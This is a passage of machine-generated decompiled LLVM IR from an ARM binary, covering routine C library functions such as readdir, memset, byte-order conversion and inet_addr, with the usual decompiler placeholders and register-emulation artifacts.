  br i1 %v7_1ab50, label %dec_label_pc_1ab58, label %dec_label_pc_1ab74

dec_label_pc_1ab58:                               ; preds = %dec_label_pc_1ab4c
  %v0_1ab5c = call i32 @__aeabi_read_tp()
  %v3_1ab60 = load i16, i16* @global_var_2c068.414, align 2
  %v0_1ab64 = load i32, i32* @r5, align 4
  store i32 %v0_1ab64, i32* %r1.global-to-local, align 4
  %v0_1ab68 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ab68 = add i32 %v0_1ab68, 21
  br label %dec_label_pc_1ab6c

dec_label_pc_1ab6c:                               ; preds = %dec_label_pc_1ab20, %dec_label_pc_1ab58
  %v2_1ab6c.in = phi i16 [ %v3_1ab28, %dec_label_pc_1ab20 ], [ %v3_1ab60, %dec_label_pc_1ab58 ]
  %v1_1ab6c = phi i32 [ %v0_1ab24, %dec_label_pc_1ab20 ], [ %v0_1ab5c, %dec_label_pc_1ab58 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_1ab20 ], [ %v1_1ab68, %dec_label_pc_1ab58 ]
  %v2_1ab6c = sext i16 %v2_1ab6c.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_1ab6c = add i32 %v1_1ab6c, %v2_1ab6c
  %v4_1ab6c = inttoptr i32 %v3_1ab6c to i32*
  store i32 %storemerge, i32* %v4_1ab6c, align 4
  %v0_1ab8c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ab8c

dec_label_pc_1ab74:                               ; preds = %dec_label_pc_1ab4c
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_1ab78 = load i32, i32* @r4, align 4
  %v2_1ab7c = call i32 @fd_to_DIR(i32 %v0_1ab78, i32 %tmp)
  store i32 %v2_1ab7c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ab8c

dec_label_pc_1ab88:                               ; preds = %entry, %dec_label_pc_1ab38
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ab8c

dec_label_pc_1ab8c:                               ; preds = %dec_label_pc_1ab74, %dec_label_pc_1ab6c, %dec_label_pc_1ab88
  %v0_1ab8c = phi i32 [ %v2_1ab7c, %dec_label_pc_1ab74 ], [ %v0_1ab8c.pre, %dec_label_pc_1ab6c ], [ 0, %dec_label_pc_1ab88 ]
  ret i32 %v0_1ab8c

; uselistorder directives
  uselistorder i32 %v1_1ab4c, { 1, 0 }
  uselistorder i32 %v2_1ab40, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 2, 0, 1 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_1ab8c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1ab88, { 1, 0 }
  uselistorder label %dec_label_pc_1ab6c, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1aba4 = load i32, i32* @r4, align 4
  %v6_1aba4 = load i32, i32* @r5, align 4
  %v9_1aba4 = load i32, i32* @r6, align 4
  %v12_1aba4 = load i32, i32* @r7, align 4
  %v15_1aba4 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r6, align 4
  %v1_1abb8 = add i32 %tmp, 24
  store i32 %v1_1abb8, i32* @r4, align 4
  %v4_1abbc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 68) to i32*), align 4
  store i32 %v4_1abbc, i32* %r1.global-to-local, align 4
  store i32 %v1_1abb8, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_1abd0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1abd0)
  %v0_1abe4 = load i32, i32* @r6, align 4
  %v2_1abe4 = add i32 %v0_1abe4, 16
  %v3_1abe4 = inttoptr i32 %v2_1abe4 to i32*
  %v4_1abe4 = load i32, i32* %v3_1abe4, align 4
  store i32 %v4_1abe4, i32* @ip, align 4
  store i32 109552, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1abe4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1abf4

dec_label_pc_1abf4:                               ; preds = %dec_label_pc_1ac24, %entry
  %v0_1abf4 = load i32, i32* @r5, align 4
  %v1_1abf4 = add i32 %v0_1abf4, 4
  %v2_1abf4 = inttoptr i32 %v1_1abf4 to i32*
  %v3_1abf4 = load i32, i32* %v2_1abf4, align 4
  store i32 %v3_1abf4, i32* %r2.global-to-local, align 4
  %v4_1abf4 = add i32 %v0_1abf4, 8
  %v5_1abf4 = inttoptr i32 %v4_1abf4 to i32*
  %v6_1abf4 = load i32, i32* %v5_1abf4, align 4
  %tmp10 = icmp ugt i32 %v6_1abf4, %v3_1abf4
  br i1 %tmp10, label %dec_label_pc_1ac24, label %dec_label_pc_1ac00

dec_label_pc_1ac00:                               ; preds = %dec_label_pc_1abf4
  %v1_1ac00 = inttoptr i32 %v0_1abf4 to i32*
  %v2_1ac00 = load i32, i32* %v1_1ac00, align 4
  %v1_1ac04 = add i32 %v0_1abf4, 12
  %v2_1ac04 = inttoptr i32 %v1_1ac04 to i32*
  %v3_1ac04 = load i32, i32* %v2_1ac04, align 4
  store i32 %v3_1ac04, i32* %r1.global-to-local, align 4
  %v1_1ac08 = add i32 %v0_1abf4, 20
  %v2_1ac08 = inttoptr i32 %v1_1ac08 to i32*
  %v3_1ac08 = load i32, i32* %v2_1ac08, align 4
  store i32 %v3_1ac08, i32* %r2.global-to-local, align 4
  %v4_1ac0c = call i32 @__getdents(i32 %v2_1ac00, i32 %v3_1ac04, i32 %v3_1ac08, i32 %v6_1abf4)
  %tmp9 = icmp slt i32 %v4_1ac0c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_1ac1c

.thread:                                          ; preds = %dec_label_pc_1ac00
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1ac50

dec_label_pc_1ac1c:                               ; preds = %dec_label_pc_1ac00
  %v1_1ac1c = load i32, i32* @r5, align 4
  %v2_1ac1c = add i32 %v1_1ac1c, 8
  %v3_1ac1c = inttoptr i32 %v2_1ac1c to i32*
  store i32 %v4_1ac0c, i32* %v3_1ac1c, align 4
  %v0_1ac20 = load i32, i32* @r7, align 4
  %v1_1ac20 = load i32, i32* @r5, align 4
  %v2_1ac20 = add i32 %v1_1ac20, 4
  %v3_1ac20 = inttoptr i32 %v2_1ac20 to i32*
  store i32 %v0_1ac20, i32* %v3_1ac20, align 4
  %v0_1ac24.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ac24

dec_label_pc_1ac24:                               ; preds = %dec_label_pc_1abf4, %dec_label_pc_1ac1c
  %v1_1ac34 = phi i32 [ %v0_1abf4, %dec_label_pc_1abf4 ], [ %v0_1ac24.pre, %dec_label_pc_1ac1c ]
  %v1_1ac24 = add i32 %v1_1ac34, 4
  %v2_1ac24 = inttoptr i32 %v1_1ac24 to i32*
  %v3_1ac24 = load i32, i32* %v2_1ac24, align 4
  store i32 %v3_1ac24, i32* %r2.global-to-local, align 4
  %v1_1ac28 = add i32 %v1_1ac34, 12
  %v2_1ac28 = inttoptr i32 %v1_1ac28 to i32*
  %v3_1ac28 = load i32, i32* %v2_1ac28, align 4
  store i32 %v3_1ac28, i32* %r1.global-to-local, align 4
  %v2_1ac2c = add i32 %v3_1ac28, %v3_1ac24
  store i32 %v2_1ac2c, i32* @r4, align 4
  %v1_1ac30 = add i32 %v2_1ac2c, 4
  %v2_1ac30 = inttoptr i32 %v1_1ac30 to i32*
  %v3_1ac30 = load i32, i32* %v2_1ac30, align 4
  %v2_1ac34 = add i32 %v1_1ac34, 16
  %v3_1ac34 = inttoptr i32 %v2_1ac34 to i32*
  store i32 %v3_1ac30, i32* %v3_1ac34, align 4
  %v0_1ac38 = load i32, i32* @r4, align 4
  %v1_1ac38 = add i32 %v0_1ac38, 8
  %v2_1ac38 = inttoptr i32 %v1_1ac38 to i16*
  %v3_1ac38 = load i16, i16* %v2_1ac38, align 2
  %v4_1ac38 = zext i16 %v3_1ac38 to i32
  %v0_1ac3c = load i32, i32* %r2.global-to-local, align 4
  %v1_1ac3c = load i32, i32* %r1.global-to-local, align 4
  %v2_1ac3c = add i32 %v1_1ac3c, %v0_1ac3c
  %v3_1ac3c = inttoptr i32 %v2_1ac3c to i32*
  %v4_1ac3c = load i32, i32* %v3_1ac3c, align 4
  store i32 %v4_1ac3c, i32* %r1.global-to-local, align 4
  %v2_1ac40 = add i32 %v0_1ac3c, %v4_1ac38
  %v2_1ac44 = icmp eq i32 %v4_1ac3c, 0
  %v1_1ac48 = load i32, i32* @r5, align 4
  %v2_1ac48 = add i32 %v1_1ac48, 4
  %v3_1ac48 = inttoptr i32 %v2_1ac48 to i32*
  store i32 %v2_1ac40, i32* %v3_1ac48, align 4
  br i1 %v2_1ac44, label %dec_label_pc_1abf4, label %dec_label_pc_1ac50

dec_label_pc_1ac50:                               ; preds = %dec_label_pc_1ac24, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1ac5c = load i32, i32* @r6, align 4
  %v2_1ac5c = add i32 %v0_1ac5c, 44
  %v3_1ac5c = inttoptr i32 %v2_1ac5c to i32*
  %v4_1ac5c = load i32, i32* %v3_1ac5c, align 4
  call void @__pseudo_branch(i32 %v4_1ac5c)
  %v0_1ac68 = load i32, i32* @r4, align 4
  store i32 %v3_1aba4, i32* @r4, align 4
  store i32 %v6_1aba4, i32* @r5, align 4
  store i32 %v9_1aba4, i32* @r6, align 4
  store i32 %v12_1aba4, i32* @r7, align 4
  store i32 %v15_1aba4, i32* @lr, align 4
  ret i32 %v0_1ac68

; uselistorder directives
  uselistorder i32 %v1_1ac34, { 0, 2, 1 }
  uselistorder i32 %v6_1abf4, { 1, 0 }
  uselistorder i32 %v0_1abf4, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_1ac24, { 1, 0 }
}

define i32 @function_1ac7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1ac7c:
  %v0_1ac7c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ac7c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1ac7c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1ac7c, %bb
  %v4_1ac88 = phi i32 [ %arg1, %dec_label_pc_1ac7c ], [ 0, %bb ]
  ret i32 %v4_1ac88

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_1ac8c = load i32, i32* @lr, align 4
  %v0_1ac94 = call i32 @__aeabi_read_tp()
  %v3_1ac98 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1ac98 = sext i16 %v3_1ac98 to i32
  %v2_1ac9c = add i32 %v4_1ac98, %v0_1ac94
  store i32 %v0_1ac8c, i32* @lr, align 4
  ret i32 %v2_1ac9c
}

define i32 @clock() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_1acb0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1acb0, i32* @r0, align 4
  %v1_1acb8 = call i32 @times(i32 %v2_1acb0)
  %v2_1acbc = load i32, i32* %stack_var_-24, align 4
  %v2_1acc0 = add i32 %v2_1acbc, %tmp
  %v2_1acc8 = mul i32 %v2_1acc0, 10000
  %v1_1accc = and i32 %v2_1acc8, 2147483632
  ret i32 %v1_1accc

; uselistorder directives
  uselistorder i32 %v2_1acb0, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_1ace0 = call i32 @_memcpy()
  ret i32 %v0_1ace0
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_1acf0 = call i32 @_memcpy()
  ret i32 %v0_1acf0

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_1ad04 = icmp eq i32 %arg3, 8
  store i1 %v8_1ad04, i1* %cpsr_z.global-to-local, align 1
  %v5_1ad08 = icmp slt i32 %arg3, 8
  br i1 %v5_1ad08, label %dec_label_pc_1ad68, label %dec_label_pc_1ad0c

dec_label_pc_1ad0c:                               ; preds = %entry
  %v4_1ad0c = mul i32 %arg2, 256
  %v5_1ad0c = or i32 %v4_1ad0c, %arg2
  %v4_1ad10 = mul i32 %v5_1ad0c, 65536
  %v5_1ad10 = or i32 %v4_1ad10, %v5_1ad0c
  store i32 %v5_1ad10, i32* @r1, align 4
  %v1_1ad1457 = urem i32 %tmp, 4
  %v2_1ad1458 = icmp eq i32 %v1_1ad1457, 0
  store i1 %v2_1ad1458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1ad1458, label %dec_label_pc_1ad24, label %bb

bb:                                               ; preds = %dec_label_pc_1ad0c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1ad0c ]
  %v3_1ad1859 = phi i32 [ %v6_1ad18, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1ad0c ]
  %v4_1ad18 = inttoptr i32 %v3_1ad1859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_1ad18, align 1
  %v5_1ad18 = load i32, i32* @r3, align 4
  %v6_1ad18 = add i32 %v5_1ad18, 1
  store i32 %v6_1ad18, i32* @r3, align 4
  %v0_1ad1c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_1ad28.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_1ad1c.pr, label %dec_label_pc_1ad24, label %.thread

.thread:                                          ; preds = %bb
  %v2_1ad1c = add i32 %v0_1ad28.pr.pre, -1
  store i32 %v2_1ad1c, i32* %r2.global-to-local, align 4
  %v1_1ad14 = urem i32 %v6_1ad18, 4
  %v2_1ad14 = icmp eq i32 %v1_1ad14, 0
  store i1 %v2_1ad14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ad14, label %dec_label_pc_1ad24, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_1ad18.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_1ad18.pre to i8
  br label %bb

dec_label_pc_1ad24:                               ; preds = %.thread, %bb, %dec_label_pc_1ad0c
  %v0_1ad3028 = phi i32 [ %tmp, %dec_label_pc_1ad0c ], [ %v6_1ad18, %bb ], [ %v6_1ad18, %.thread ]
  %v0_1ad28.pr = phi i32 [ %arg3, %dec_label_pc_1ad0c ], [ %v0_1ad28.pr.pre, %bb ], [ %v2_1ad1c, %.thread ]
  %v0_1ad24 = load i32, i32* @r1, align 4
  store i32 %v0_1ad24, i32* %ip.global-to-local, align 4
  %v8_1ad2810 = icmp eq i32 %v0_1ad28.pr, 8
  store i1 %v8_1ad2810, i1* %cpsr_z.global-to-local, align 1
  %v5_1ad2c11 = icmp slt i32 %v0_1ad28.pr, 8
  br i1 %v5_1ad2c11, label %dec_label_pc_1ad68, label %dec_label_pc_1ad30.preheader

dec_label_pc_1ad30.preheader:                     ; preds = %dec_label_pc_1ad24
  %v1_1ad3046 = inttoptr i32 %v0_1ad3028 to i32*
  store i32 %v0_1ad24, i32* %v1_1ad3046, align 4
  %v3_1ad3047 = add i32 %v0_1ad3028, 4
  %v4_1ad3048 = inttoptr i32 %v3_1ad3047 to i32*
  %v5_1ad3049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1ad3049, i32* %v4_1ad3048, align 4
  %v6_1ad3050 = add i32 %v0_1ad3028, 8
  store i32 %v6_1ad3050, i32* @r3, align 4
  %v0_1ad3451 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ad3452 = add i32 %v0_1ad3451, -8
  store i32 %v1_1ad3452, i32* %r2.global-to-local, align 4
  %v5_1ad3c53 = icmp slt i32 %v1_1ad3452, 8
  br i1 %v5_1ad3c53, label %dec_label_pc_1ad30.dec_label_pc_1ad68.loopexit_crit_edge, label %dec_label_pc_1ad40

dec_label_pc_1ad40:                               ; preds = %dec_label_pc_1ad30.preheader, %dec_label_pc_1ad28.dec_label_pc_1ad30_crit_edge
  %v6_1ad3055 = phi i32 [ %v6_1ad30, %dec_label_pc_1ad28.dec_label_pc_1ad30_crit_edge ], [ %v6_1ad3050, %dec_label_pc_1ad30.preheader ]
  %v0_1ad3054 = phi i32 [ %v12_1ad5c, %dec_label_pc_1ad28.dec_label_pc_1ad30_crit_edge ], [ %v0_1ad3028, %dec_label_pc_1ad30.preheader ]
  %v1_1ad40 = inttoptr i32 %v6_1ad3055 to i32*
  %v2_1ad40 = load i32, i32* @r1, align 4
  store i32 %v2_1ad40, i32* %v1_1ad40, align 4
  %v3_1ad40 = add i32 %v0_1ad3054, 12
  %v4_1ad40 = inttoptr i32 %v3_1ad40 to i32*
  %v5_1ad40 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1ad40, i32* %v4_1ad40, align 4
  %v6_1ad40 = add i32 %v0_1ad3054, 16
  store i32 %v6_1ad40, i32* @r3, align 4
  %v0_1ad44 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ad44 = add i32 %v0_1ad44, -8
  store i32 %v1_1ad44, i32* %r2.global-to-local, align 4
  %v5_1ad4c = icmp slt i32 %v1_1ad44, 8
  br i1 %v5_1ad4c, label %dec_label_pc_1ad40.dec_label_pc_1ad68.loopexit_crit_edge, label %dec_label_pc_1ad50

dec_label_pc_1ad50:                               ; preds = %dec_label_pc_1ad40
  %v1_1ad50 = inttoptr i32 %v6_1ad40 to i32*
  %v2_1ad50 = load i32, i32* @r1, align 4
  store i32 %v2_1ad50, i32* %v1_1ad50, align 4
  %v3_1ad50 = add i32 %v0_1ad3054, 20
  %v4_1ad50 = inttoptr i32 %v3_1ad50 to i32*
  %v5_1ad50 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1ad50, i32* %v4_1ad50, align 4
  %v6_1ad50 = add i32 %v0_1ad3054, 24
  store i32 %v6_1ad50, i32* @r3, align 4
  %v0_1ad54 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ad54 = add i32 %v0_1ad54, -8
  store i32 %v1_1ad54, i32* %r2.global-to-local, align 4
  %v5_1ad5c = icmp slt i32 %v1_1ad54, 8
  br i1 %v5_1ad5c, label %dec_label_pc_1ad50.dec_label_pc_1ad68.loopexit_crit_edge, label %dec_label_pc_1ad28

dec_label_pc_1ad28:                               ; preds = %dec_label_pc_1ad50
  %v7_1ad5c = inttoptr i32 %v6_1ad50 to i32*
  %v8_1ad5c = load i32, i32* @r1, align 4
  store i32 %v8_1ad5c, i32* %v7_1ad5c, align 4
  %v9_1ad5c = add i32 %v0_1ad3054, 28
  %v10_1ad5c = inttoptr i32 %v9_1ad5c to i32*
  %v11_1ad5c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_1ad5c, i32* %v10_1ad5c, align 4
  %v12_1ad5c = add i32 %v0_1ad3054, 32
  store i32 %v12_1ad5c, i32* @r3, align 4
  %v6_1ad60 = load i32, i32* %r2.global-to-local, align 4
  %v7_1ad60 = add i32 %v6_1ad60, -8
  store i32 %v7_1ad60, i32* %r2.global-to-local, align 4
  %v5_1ad2c = icmp slt i32 %v7_1ad60, 8
  br i1 %v5_1ad2c, label %dec_label_pc_1ad28.dec_label_pc_1ad68.loopexit_crit_edge, label %dec_label_pc_1ad28.dec_label_pc_1ad30_crit_edge

dec_label_pc_1ad28.dec_label_pc_1ad30_crit_edge:  ; preds = %dec_label_pc_1ad28
  %v2_1ad30.pre = load i32, i32* @r1, align 4
  %v1_1ad30 = inttoptr i32 %v12_1ad5c to i32*
  store i32 %v2_1ad30.pre, i32* %v1_1ad30, align 4
  %v3_1ad30 = add i32 %v0_1ad3054, 36
  %v4_1ad30 = inttoptr i32 %v3_1ad30 to i32*
  %v5_1ad30 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1ad30, i32* %v4_1ad30, align 4
  %v6_1ad30 = add i32 %v0_1ad3054, 40
  store i32 %v6_1ad30, i32* @r3, align 4
  %v0_1ad34 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ad34 = add i32 %v0_1ad34, -8
  store i32 %v1_1ad34, i32* %r2.global-to-local, align 4
  %v5_1ad3c = icmp slt i32 %v1_1ad34, 8
  br i1 %v5_1ad3c, label %dec_label_pc_1ad30.dec_label_pc_1ad68.loopexit_crit_edge, label %dec_label_pc_1ad40

dec_label_pc_1ad28.dec_label_pc_1ad68.loopexit_crit_edge: ; preds = %dec_label_pc_1ad28
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1ad68

dec_label_pc_1ad30.dec_label_pc_1ad68.loopexit_crit_edge: ; preds = %dec_label_pc_1ad28.dec_label_pc_1ad30_crit_edge, %dec_label_pc_1ad30.preheader
  %v1_1ad34.lcssa = phi i32 [ %v1_1ad3452, %dec_label_pc_1ad30.preheader ], [ %v1_1ad34, %dec_label_pc_1ad28.dec_label_pc_1ad30_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1ad68

dec_label_pc_1ad40.dec_label_pc_1ad68.loopexit_crit_edge: ; preds = %dec_label_pc_1ad40
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1ad68

dec_label_pc_1ad50.dec_label_pc_1ad68.loopexit_crit_edge: ; preds = %dec_label_pc_1ad50
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1ad68

dec_label_pc_1ad68:                               ; preds = %dec_label_pc_1ad24, %dec_label_pc_1ad28.dec_label_pc_1ad68.loopexit_crit_edge, %dec_label_pc_1ad30.dec_label_pc_1ad68.loopexit_crit_edge, %dec_label_pc_1ad40.dec_label_pc_1ad68.loopexit_crit_edge, %dec_label_pc_1ad50.dec_label_pc_1ad68.loopexit_crit_edge, %entry
  %v0_1ad70 = phi i32 [ %arg3, %entry ], [ %v1_1ad54, %dec_label_pc_1ad50.dec_label_pc_1ad68.loopexit_crit_edge ], [ %v1_1ad44, %dec_label_pc_1ad40.dec_label_pc_1ad68.loopexit_crit_edge ], [ %v1_1ad34.lcssa, %dec_label_pc_1ad30.dec_label_pc_1ad68.loopexit_crit_edge ], [ %v7_1ad60, %dec_label_pc_1ad28.dec_label_pc_1ad68.loopexit_crit_edge ], [ %v0_1ad28.pr, %dec_label_pc_1ad24 ]
  %v2_1ad68 = icmp eq i32 %v0_1ad70, 0
  store i1 %v2_1ad68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ad68, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_1ad68
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_1ad68
  %v1_1ad70 = sub i32 7, %v0_1ad70
  store i32 %v1_1ad70, i32* %r2.global-to-local, align 4
  %v3_1ad74 = mul i32 %v1_1ad70, 4
  %v4_1ad74 = add i32 %v3_1ad74, ptrtoint (i32* @global_var_1ad7c.457 to i32)
  call void @__pseudo_branch(i32 %v4_1ad74)
  %v0_1ad7c = load i32, i32* @r1, align 4
  %v1_1ad7c = trunc i32 %v0_1ad7c to i8
  %v2_1ad7c = load i32, i32* @r3, align 4
  %v3_1ad7c = inttoptr i32 %v2_1ad7c to i8*
  store i8 %v1_1ad7c, i8* %v3_1ad7c, align 1
  %v4_1ad7c = load i32, i32* @r3, align 4
  %v5_1ad7c = add i32 %v4_1ad7c, 1
  store i32 %v5_1ad7c, i32* %r3.global-to-local, align 4
  %v0_1ad80 = load i32, i32* @r1, align 4
  %v1_1ad80 = trunc i32 %v0_1ad80 to i8
  %v3_1ad80 = inttoptr i32 %v5_1ad7c to i8*
  store i8 %v1_1ad80, i8* %v3_1ad80, align 1
  %v4_1ad80 = load i32, i32* %r3.global-to-local, align 4
  %v5_1ad80 = add i32 %v4_1ad80, 1
  store i32 %v5_1ad80, i32* %r3.global-to-local, align 4
  %v0_1ad84 = load i32, i32* @r1, align 4
  %v1_1ad84 = trunc i32 %v0_1ad84 to i8
  %v3_1ad84 = inttoptr i32 %v5_1ad80 to i8*
  store i8 %v1_1ad84, i8* %v3_1ad84, align 1
  %v4_1ad84 = load i32, i32* %r3.global-to-local, align 4
  %v5_1ad84 = add i32 %v4_1ad84, 1
  store i32 %v5_1ad84, i32* %r3.global-to-local, align 4
  %v0_1ad88 = load i32, i32* @r1, align 4
  %v1_1ad88 = trunc i32 %v0_1ad88 to i8
  %v3_1ad88 = inttoptr i32 %v5_1ad84 to i8*
  store i8 %v1_1ad88, i8* %v3_1ad88, align 1
  %v4_1ad88 = load i32, i32* %r3.global-to-local, align 4
  %v5_1ad88 = add i32 %v4_1ad88, 1
  store i32 %v5_1ad88, i32* %r3.global-to-local, align 4
  %v0_1ad8c = load i32, i32* @r1, align 4
  %v1_1ad8c = trunc i32 %v0_1ad8c to i8
  %v3_1ad8c = inttoptr i32 %v5_1ad88 to i8*
  store i8 %v1_1ad8c, i8* %v3_1ad8c, align 1
  %v4_1ad8c = load i32, i32* %r3.global-to-local, align 4
  %v5_1ad8c = add i32 %v4_1ad8c, 1
  store i32 %v5_1ad8c, i32* %r3.global-to-local, align 4
  %v0_1ad90 = load i32, i32* @r1, align 4
  %v1_1ad90 = trunc i32 %v0_1ad90 to i8
  %v3_1ad90 = inttoptr i32 %v5_1ad8c to i8*
  store i8 %v1_1ad90, i8* %v3_1ad90, align 1
  %v4_1ad90 = load i32, i32* %r3.global-to-local, align 4
  %v5_1ad90 = add i32 %v4_1ad90, 1
  store i32 %v5_1ad90, i32* %r3.global-to-local, align 4
  %v0_1ad94 = load i32, i32* @r1, align 4
  %v1_1ad94 = trunc i32 %v0_1ad94 to i8
  %v3_1ad94 = inttoptr i32 %v5_1ad90 to i8*
  store i8 %v1_1ad94, i8* %v3_1ad94, align 1
  %v4_1ad94 = load i32, i32* %r3.global-to-local, align 4
  %v5_1ad94 = add i32 %v4_1ad94, 1
  store i32 %v5_1ad94, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_1ad30, { 1, 0 }
  uselistorder i32 %v12_1ad5c, { 1, 2, 0 }
  uselistorder i32 %v0_1ad3054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_1ad28.pr, { 0, 2, 1 }
  uselistorder i32 %v6_1ad18, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1ad0c, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 11, 13, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 2, 5, 0, 9, 8, 1, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1ad68, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_1ad40, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1ada0 = udiv i32 %arg1, 256
  %v1_1ada4 = mul i32 %arg1, 256
  %v4_1ada8 = and i32 %v1_1ada4, 65280
  %v5_1ada8 = or i32 %v4_1ada8, %v3_1ada0
  ret i32 %v5_1ada8
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_1adc8 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_1adc8
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1add0 = udiv i32 %arg1, 256
  %v1_1add4 = mul i32 %arg1, 256
  %v4_1add8 = and i32 %v1_1add4, 65280
  %v5_1add8 = or i32 %v4_1add8, %v3_1add0
  ret i32 %v5_1add8
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_1adf8 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_1adf8
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_1ae08 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1ae08, i32* @r1, align 4
  %v0_1ae0c = call i32 @inet_aton()
  %v2_1ae10 = icmp eq i32 %v0_1ae0c, 0
  %v4_1ae14 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_1ae10, i32 -1, i32 %v4_1ae14
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
